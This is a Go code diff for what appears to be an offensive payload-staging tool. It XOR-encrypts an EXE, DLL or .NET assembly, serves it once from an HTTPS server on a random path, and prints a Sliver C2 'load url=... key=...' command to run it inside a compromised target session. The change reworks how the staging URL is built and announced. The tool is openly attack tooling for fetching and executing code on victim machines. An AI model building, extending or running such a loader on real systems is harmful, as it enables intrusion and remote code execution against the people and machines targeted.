@@ -27,8 +27,8 @@ import (
 	"fmt"
 	"io"
 	"math/big"
-	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -89,7 +89,7 @@ func init() {
 	loadCmd.Flags().StringVar(&loadBinary, "binary", "", "path to EXE, DLL, or .NET assembly (required)")
 	loadCmd.Flags().StringVar(&loadArgs, "args", "", "command-line arguments passed to the binary")
 	loadCmd.Flags().StringVar(&loadMethod, "method", "", "DLL export to invoke (DLLs only; empty = DllMain)")
-	loadCmd.Flags().StringVar(&loadURL, "url", "", "HTTPS URL the Sliver Extension fetches the payload from (required)")
+	loadCmd.Flags().StringVar(&loadURL, "url", "", "your HTTPS host (e.g. https://10.0.0.1:8443) — the path is ignored, a random one is generated (required)")
 	loadCmd.Flags().StringVarP(&loadOutput, "output", "o", "build", "output directory for payload.enc")
 	loadCmd.Flags().BoolVar(&loadServe, "serve", false, "start one-time HTTPS server after converting")
 	loadCmd.Flags().IntVar(&loadPort, "port", 8443, "port for payload server (when --serve)")
@@ -139,22 +139,41 @@ func runLoad(_ *cobra.Command, _ []string) error {
 		return fmt.Errorf("writing payload: %w", err)
 	}
 
-	// ── Step 4: Print Sliver command ───────────────────────────────────────
+	// ── Step 4: Build staging URL + print command ─────────────────────────
 
 	keyHex := hex.EncodeToString(xorKey)
 	fmt.Printf("\n[+] payload → %s (%d bytes)\n", payloadPath, len(encrypted))
-	fmt.Printf("[+] url     → %s\n\n", loadURL)
-	fmt.Printf("[i] First time: install extension\n")
+	fmt.Printf("[+] key     → %s\n\n", keyHex)
+	fmt.Printf("[i] First time (once per Sliver server):\n")
 	fmt.Printf("    sliver> extensions install build/load-0.1.0.tar.gz\n\n")
-	fmt.Printf("[i] Execute in an active session:\n")
-	fmt.Printf("    sliver (TARGET)> load url=%s key=%s\n\n", loadURL, keyHex)
 
 	// ── Step 5: Serve payload (optional) ──────────────────────────────────
 
 	if loadServe {
-		fmt.Printf("[*] Starting one-time HTTPS server on :%d …\n", loadPort)
-		return newPayloadServer(encrypted, loadPort).ListenAndServe()
+		srv := newPayloadServer(encrypted, loadPort)
+
+		// Build the real URL: use the scheme+host from --url, replace path with the random one.
+		baseURL, err := url.Parse(loadURL)
+		if err != nil {
+			return fmt.Errorf("invalid --url: %w", err)
+		}
+		stagingURL := fmt.Sprintf("%s://%s%s", baseURL.Scheme, baseURL.Host, srv.path)
+
+		fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", loadPort)
+		fmt.Printf("[+] Staging URL: %s\n", stagingURL)
+		fmt.Printf("    (random path generated automatically — only this URL works)\n\n")
+		fmt.Printf("[i] Execute in Sliver:\n")
+		fmt.Printf("    sliver (TARGET)> load url=%s key=%s\n\n", stagingURL, keyHex)
+
+		return srv.ListenAndServe()
 	}
+
+	// No --serve: tell the operator what to do next.
+	fmt.Printf("[i] Start the staging server when ready:\n")
+	fmt.Printf("    ./loadkit serve --payload %s\n", payloadPath)
+	fmt.Printf("    (the server will print the exact URL to use)\n\n")
+	fmt.Printf("[i] Then in Sliver:\n")
+	fmt.Printf("    sliver (TARGET)> load url=<URL printed by serve> key=%s\n\n", keyHex)
 	return nil
 }
 
@@ -407,12 +426,6 @@ func (s *payloadServer) ListenAndServe() error {
 		}()
 	})
 
-	addrs, _ := net.InterfaceAddrs()
-	for _, a := range addrs {
-		if ip, ok := a.(*net.IPNet); ok && !ip.IP.IsLoopback() && ip.IP.To4() != nil {
-			fmt.Printf("[+] Payload URL: https://%s:%d%s\n", ip.IP, s.port, s.path)
-		}
-	}
 	if err := srv.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
 		return err
 	}
